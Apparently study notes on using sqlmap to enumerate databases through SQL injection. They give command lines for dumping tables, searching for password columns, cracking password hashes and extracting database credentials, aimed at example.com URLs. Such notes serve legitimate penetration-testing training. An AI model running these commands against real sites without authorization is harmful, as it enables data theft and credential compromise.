# Basic Database Enumeration

Enumeration usually starts with the retrieval of the basic information:

- Database version banner (switch `--banner`)
- Current user name (switch `--current-user`)
- Current database name (switch `--current-db`)
- Checking if the current user has DBA (administrator) rights (switch `--is-dba`)

```sh
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

## Table Enumeration

```sh
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```

After we spot the table of interest we can retrieve the content of it using `--dump` option and specifying the table name with `-T` option, as follows:

```sh
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```

```ad-tip
Apart from default CSV, we can specify the output format with the option `--dump-format` to HTML or SQLite, so that we can later further investigate the DB in an SQLite environment.
```

## Table/Row Enumeration

When dealing with tables that contains many columns and/or rows, we can specify the columns with the `-C` option as follows:

```sh
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```

To narrow down the rows based on their original number(s) inside the table, we can specify the rows with the `--start` and `--stop` option

```sh
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```

## Conditional Enumeration

We can use the `--where` option as follows:

```sh
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```

## Full DB Enumeration

Instead of dumping the content of a single table, we can dump the whole database by **removing** the `-T` option:

```sh
--dump -D testdb
```

As for `--dump-all` option, it will retrieve all content from all databases.

We can also use:

```sh
--dump-all --exclude-sysdbs
```

To instruct SQLMap to skip the retrieval of content from system databases.

---
# Advanced Database Enumeration

## DB Schema Enumeration

If we wanted to retrieve the structure of all tables in a database, we can use the `--schema` option:

```sh
sqlmap -u "http://www.example.com/?id=1" --schema
```

## Searching for Data

While dealing with complex database structures with numerous tables and columns, we can search of Databases, Tables, and Columns of interest using the `--search` option.

**Examples:** 

We are looking for a table name that contains the word *user*

```sh
sqlmap -u "http://www.example.com/?id=1" --search -T user
```

We are searching for a column that contains the word *pass*

```sh
sqlmap -u "http://www.example.com/?id=1" --search -C pass
```

## Password Enumeration and Cracking

```sh
sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
```

When SQLMap detects a known hash-pattern, it will prompt us to perform an automatic Dictionary Attack against the hashes to retrieve the passwords' values.

## DB Users Password Enumeration and Cracking

We can attempt to dump the content of system tables containing database-specific credentials.

We can use the `--passwords` option

```sh
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```

---

```ad-tip
The **--all** switch in combination with the **--batch** will automa(g)ically do the whole enumeration process on the target itself, and provide all enumeration details.
```

